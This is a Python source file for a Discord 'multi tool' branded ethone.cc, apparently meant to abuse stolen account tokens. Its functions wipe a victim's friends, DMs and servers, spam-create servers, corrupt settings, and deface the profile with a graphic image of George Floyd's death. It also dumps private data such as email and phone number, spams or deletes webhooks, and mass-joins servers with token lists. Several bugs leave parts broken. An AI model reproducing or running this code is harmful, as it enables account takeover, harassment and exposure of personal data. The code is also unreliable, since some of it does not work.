import os
import pyfade
import ctypes
from pystyle import Center, System, Cursor
from base64 import b64encode
import httpx
import time
import string
import random
import json
from datetime import datetime

def get_headers(token):
    return {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36"}

def random_string(length):
   letters=string.ascii_lowercase+string.ascii_uppercase+string
   return ''.join(random.choice(letters) for i in range(length))

def token_validate(token):
    r=httpx.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
    if r.status_code==200:
        return True
    return False

def create_files():
    if not os.path.exists("tokens.txt"):
        with open("tokens.txt", "w") as f:f.close()

def title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(f"xyMulti Tool | ethone.cc | {title}")

def printcenter(text):
    print(pyfade.Fade.Horizontal(pyfade.Colors.red_to_yellow, Center.XCenter(text)))

def printnormal(text):
    print(pyfade.Fade.Horizontal(pyfade.Colors.red_to_yellow, text))

def inputnormal(text, int_=False):
    if int_==False:
        value=input((pyfade.Fade.Horizontal(pyfade.Colors.red_to_yellow, text)))
    else:
        value=int(input((pyfade.Fade.Horizontal(pyfade.Colors.red_to_yellow, text))))
    return value

def do_return():
    printnormal("Going back to menu in 1 second...")
    time.sleep(3)
    menu()

def print_spaces(amount: int):
    string=""
    for i in range(amount-1):
        string=string+"\n"
    print(string)

def call_ascii():
    System.Clear()
    ascii=r"""        
__  ___   _  ███╗   ███╗██╗   ██╗██╗  ████████╗██╗ ████████╗ ██████╗  ██████╗ ██╗
\ \/ / | | | ████╗ ████║██║   ██║██║  ╚══██╔══╝██║ ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
 >  <| |_| | ██╔████╔██║██║   ██║██║     ██║   ██║    ██║   ██║   ██║██║   ██║██║     
/_/\_\\__, | ██║╚██╔╝██║██║   ██║██║     ██║   ██║    ██║   ██║   ██║██║   ██║██║     
       __/ | ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║    ██║   ╚██████╔╝╚██████╔╝███████╗
      |___/  ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"""

    print(pyfade.Fade.Vertical(pyfade.Colors.red_to_yellow, Center.XCenter(ascii)))
    print(pyfade.Fade.Horizontal(pyfade.Colors.yellow_to_red, "————————————————————————————————————————————————————————————————————————————————————————————————————"))
    print_spaces(1)

class functions:
    def nuke_token(token):
        __headers__=get_headers(token)

        # friends

        r=httpx.get("https://discord.com/api/v9/users/@me/relationships", headers=__headers__)
        for user in r.json():
            if user["type"]==1:
                httpx.delete(f"https://discord.com/api/v9/users/@me/relationships/{user['id']}", headers=__headers__)
        printnormal("Friends deleted.")

        # dms

        r=httpx.get("https://discord.com/api/v9/users/@me/channels", headers=__headers__)
        for channel in r.json():
            httpx.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=__headers__)
        printnormal("Dms closed.")

        # servers

        r=httpx.get("https://discord.com/api/v9/users/@me/guilds", headers=__headers__)
        for guild in r.json():
            re=httpx.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=__headers__)
            if not re.status_code==200:
                httpx.delete(f"https://discord.com/api/v9/guilds/{guild['id']}/delete", headers=__headers__)
        printnormal("Guilds deleted.")

        for i in range(100):
            httpx.post("https://discord.com/api/v9/guilds", headers=__headers__, json={"name": f"{random_string(3)} | ethone.cc | {random_string(3)}"})
        printnormal("Guilds spammed.")

        # settings

        payload={
            "theme": "light",
            "developer_mode": True,
            "afk_timeout": 60,
            "locale": "ko",
            "message_display_compact": True,
            "explicit_content_filter": 2,
            "default_guilds_restricted": True,
            "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True},
            "inline_embed_media": True,
            "inline_attachment_media": True,
            "gif_auto_play": True,
            "render_embeds": False,
            "render_reactions": False,
            "animate_emoji": False,
            "convert_emoticons": True,
            "animate_stickers": 1,
            "enable_tts_command": True, 
            "native_phone_integration_enabled":True, 
            "contact_sync_enabled": True,
            "allow_accessibility_detection": True,
            "stream_notifications_enabled": True,
            "status": "idle",
            "detect_platform_accounts":True, 
            "disable_games_tab": True
        }
        httpx.post("https://com/api/v9/users/@me/settings", headers=__headers__, json=payload)
        printnormal("Corrupted settings.")

        # bio, status % avatar

        pfp=httpx.get("https://static01.nyt.com/images/2020/05/27/us/27georgefloyd/27georgefloyd-videoSixteenByNineJumbo1600.jpg")
        httpx.patch("https://discord.com/api/v9/users/@me/profile", headers=__headers__, json={
            "bio": "Nuked by https://ethone.cc",
            "custom_status": {"text": "Owned by ethone.cc", "emoji_name": "✋"},
            "avatar": f"data:image/png;base64,{b64encode(pfp.content).decode('ascii')}"})
        printnormal("Changed bio, status and pfp.")
        printnormal("Finished.")
        do_return()

    def disable_token(token):
        __headers__=get_headers(token)

        # leave one guild

        r=httpx.get("https://discord.com/api/v9/users/@me/guilds", headers=__headers__)
        guild=r.json()[0]
        re=httpx.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=__headers__)
        if not re.status_code==200:
            httpx.delete(f"https://discord.com/api/v9/guilds/{guild['id']}/delete", headers=__headers__)

        # create guild

        r=httpx.post("https://discord.com/api/v9/guilds", headers=__headers__, json={"name": "ethone.cc"})
        id=r.json()["id"]

        # disable token by mass reporting

        while True:
            r=httpx.put(f"https://discord.com/api/v9/guilds/{id}/bans/204255221017214977")
            if r.status_code in [403, 401, 404]:
                break
            printnormal("Token disabled.")
            do_return()

    def token_info(token):
        __headers__=get_headers(token)

        # get info

        r=httpx.get("https://discord.com/api/v9/users/@me", headers=__headers__)
        nitro=httpx.get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", headers=__headers__)
        friends=httpx.get("https://discord.com/api/v9/users/@me/relationships", headers=__headers__)
        guilds=httpx.get("https://discordapp.com/api/v9/users/@me/guilds", headers=__headers__)

        id=r.json()["id"]
        username=f"{r.json()['username']}#{r.json()['discriminator']}"

        if r.json()["avatar"]==None:
            avatar_url=None
        else:
            avatar_url=f"cdn.discordapp.com/avatars/{id}/{r.json()['avatar']}.png?size=1024"
            if r.json()["avatar"].startswith("_a"):
                avatar_url=avatar_url.replace("png", "gif")

        avatar_decoration=r.json()["avatar_decoration"]

        hype_squad=""
        houses={
            64: "bravery",
            128: "brilliance",
            256: "balance"
        }
        for house in houses:
            if r.json()["flags"]==house:
                hype_squad=houses[house]
                break

        if r.json()["banner"]==None:
            banner_url=None
        else:
            banner_url=f"cdn.discordapp.com/banners/{id}/{r.json()['banner']}.png?size=1024"
            if r.json()["banner"].startswith("_a"):
                banner_url=avatar_url.replace("png", "gif")

        banner_color=r.json()["banner_color"]
        accent_color=r.json()["accent_color"]

        req=httpx.post("https://hastebin.com/documents", data=r.json()["bio"])
        req=json.loads(req.text)
        bio=f"hastebin.com/{req['key']}"

        locale=r.json()["locale"]
        nsfw_allowed=r.json()["nsfw_allowed"]
        mfa_enabled=r.json()["mfa_enabled"]
        email=r.json()["email"]
        email_confirmed=r.json()["verified"]
        phone_number=r.json()["phone"]

        btshift=int(id)>>22
        btshifttwo=btshift+1420070400000
        btshiftthree=btshifttwo/1000
        create_date=datetime.fromtimestamp(btshiftthree)
        create_date=str(create_date)
        create_date=create_date.split(" ")
        create_date=create_date[0].replace("-", ".")

        nitro_status=bool(len(nitro.json()) > 0)
        
        friend_amount=0
        for friend in friends.json():
            if friend["type"]==1:
                friend_amount=friend_amount+1

        guild_amount=0
        for guild in guilds.json():
            guild_amount=guild_amount+1

        # printing

        call_ascii()
        printnormal(f"Username: {username}")
        printnormal(f"ID: {id}")
        printnormal(f"Creation date: {create_date}")
        printnormal(f"Avatar url:")
        printnormal(str(avatar_url))
        printnormal(f"Avatar decoration: {avatar_decoration}")
        printnormal(f"Banner url:")
        printnormal(str(banner_url))
        printnormal(f"Banner color: {banner_color}")
        printnormal(f"Accent color: {accent_color}")
        printnormal(f"Bio: {bio}")
        printnormal(f"Hypesquad: {hype_squad}")
        printnormal(f"Nsfw allowed: {nsfw_allowed}")
        printnormal(f"2FA enabled: {mfa_enabled}")
        printnormal(f"Nitro status: {nitro_status}")
        printnormal(f"Friends: {friend_amount}")
        printnormal(f"Guilds: {guild_amount}")
        printnormal(f"Email confirmed: {email_confirmed}")
        printnormal(f"Email: {email}")
        printnormal(f"Phone number: {phone_number}")
        inputnormal("Press enter to continue")
        do_return()

    def spam_webhook(webhook):
        msg=inputnormal("Message: ")
        amount=inputnormal("Amount: ", int_=True)
        for i in range(amount):
            r=httpx.post(webhook, json={
                "content" : msg,
                "username": "ethone.cc",
                "avatar_url": "https://static01.nyt.com/images/2020/05/27/us/27georgefloyd/27georgefloyd-videoSixteenByNineJumbo1600.jpg"
                }, params={"wait" : True})
            if r.status_code==429:
                printnormal(f"Ratelimited for: {r.json()['retry_after']}ms ({i+1}/{amount})")
                time.sleep(r.json()["retry_after"] / 1000)
            else:
                printnormal(f"Message sent ({i+1}/{amount})")
        printnormal("Finished.")
        do_return()

    def delete_webhook(webhook):
        httpx.delete(webhook)
        printnormal("Webhook deleted.")
        do_return()

    def webhook_info(webhook):
        r=httpx.get(webhook)

        call_ascii()
        printnormal(f"ID: {r.json()['id']}")
        printnormal(f"Token: {r.json()['token']}")
        printnormal(f"Application ID: {r.json()['application_id']}")
        printnormal(f"Guild ID: {r.json()['guild_id']}")
        printnormal(f"Channel ID: {r.json()['channel_id']}")
        printnormal(f"Name: {r.json()['name']}")
        printnormal(f"Avatar url:")
        printnormal(f"cdn.discordapp.com/avatars/{r.json()['id']}/{r.json()['avatar']}.png")
        inputnormal("Press enter to continue")
        do_return()

    def token_join():
        with open("Data/tokens.txt", "r") as f:
            data=f.read()
            tokens=data.split("\n")
            for tokensss in tokens:
                if tokensss=="":
                    tokens.pop(tokensss)
        if len(tokens)==0:
            printnormal("Please fill tokens.txt with tokens first.")
            do_return()

        invite=inputnormal("Invite url (example: dw3nje): ")
        printnormal("Sorting out invalid tokens...")
        for token in tokens:
            r=httpx.get("https://discord.com/api/v9/users/@me", headers={
                "authorization": token,
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36"
                })
            if not r.status_code==200:
                tokens.pop(token)

        for token in tokens:
            r=httpx.post(
                url=f"https://discord.com/api/v9/invites/{invite}", headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': '*/*',
            'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
            'Authorization': token,
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
            'X-Discord-Locale': 'en-US',
            'X-Debug-Options': 'bugReporterEnabled',
            'Origin': 'https://discord.com',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Referer': 'https://discord.com',
            'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'TE': 'trailers',
            })
            if r.status_code==200:
                printnormal(f"Token joined successfully ({tokens.index(token)}/{len(tokens)}")
            else:
                printnormal(f"Token failed to join ({tokens.index(token)}/{len(tokens)}")

        printnormal("Finished.")
        do_return()

    def token_leave():
        with open("Data/tokens.txt", "r") as f:
            data=f.read()
            tokens=data.split("\n")
            for tokensss in tokens:
                if tokensss=="":
                    tokens.pop(tokensss)
        if len(tokens)==0:
            printnormal("Please fill tokens.txt with tokens first.")
            do_return()

        id=inputnormal("Guild id: ", int_e=True)
        printnormal("Sorting out invalid tokens...")
        for token in tokens:
            r=httpx.get("https://discord.com/api/v9/users/@me", headers={
                "authorization": token,
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36"
                })
            if not r.status_code==200:
                tokens.pop(token)

        for token in tokens:
            r=httpx.delete(f"https://discord.com/api/v9/users/@me/guilds/{id}")
            if r.status_code==200:
                printnormal(f"Token left successfully ({tokens.index(token)}/{len(tokens)}")
            else:
                printnormal(f"Token failed to leave ({tokens.index(token)}/{len(tokens)}")

        printnormal("Finished.")
        do_return()

def menu():
    title("Menu")
    System.Clear()
    call_ascii()

    printcenter("1. Nuke token | 2. Disable token | 3. Token info")
    printcenter("4. Spam webhook | 5. Delete webhook | 6. Webhook info")
    printcenter("7. Token join | 8. Token leave")
    print_spaces(1)
    __choice__=inputnormal(">> ", int_=True)

    if __choice__==1:
        title("Nuke token")
        call_ascii()
        token=inputnormal("Token: ")
        valid=token_validate(token)

        if valid==True:
            printnormal("Valid token.")
            functions.nuke_token(token)
        else:
            printnormal("Invalid token.")
            do_return()

    elif __choice__==2:
        title("Disable token")
        call_ascii()
        token=inputnormal("Token: ")
        valid=token_validate(token)

        if valid==True:
            printnormal("Valid token.")
            functions.disable_token(token)
        else:
            printnormal("Invalid token.")
            do_return()
        
    elif __choice__==3:
        title("Token info")
        call_ascii()
        token=inputnormal("Token: ")
        valid=token_validate(token)

        if valid==True:
            printnormal("Valid token.")
            functions.token_info(token)
        else:
            printnormal("Invalid token.")
            do_return()

    elif __choice__==4:
        title("Spam webhook")
        call_ascii()
        webhook=inputnormal("Webhook: ")
        valid=httpx.get(webhook)

        if valid.status_code==200:
            printnormal("Valid webhook.")
            functions.spam_webhook(webhook)
        else:
            printnormal("Invalid webhook.")
            do_return()
    
    elif __choice__==5:
        title("Delete webhook")
        call_ascii()
        webhook=inputnormal("Webhook: ")
        valid=httpx.get(webhook)

        if valid.status_code==200:
            printnormal("Valid webhook.")
            functions.delete_webhook(webhook)
        else:
            printnormal("Invalid webhook.")
            do_return()

    elif __choice__==6:
        title("Webhook info")
        call_ascii()
        webhook=inputnormal("Webhook: ")
        valid=httpx.get(webhook)

        if valid.status_code==200:
            printnormal("Valid webhook.")
            functions.webhook_info(webhook)
        else:
            printnormal("Invalid webhook.")
            do_return()

    elif __choice__==7:
        title("Token join")
        functions.token_join()

    elif __choice__==8:
        title("Token leave")
        functions.token_leave()
    
    else:
        menu()


if __name__=="__main__":
    Cursor.HideCursor()
    os.system("mode 100, 30")
    create_files()
    menu()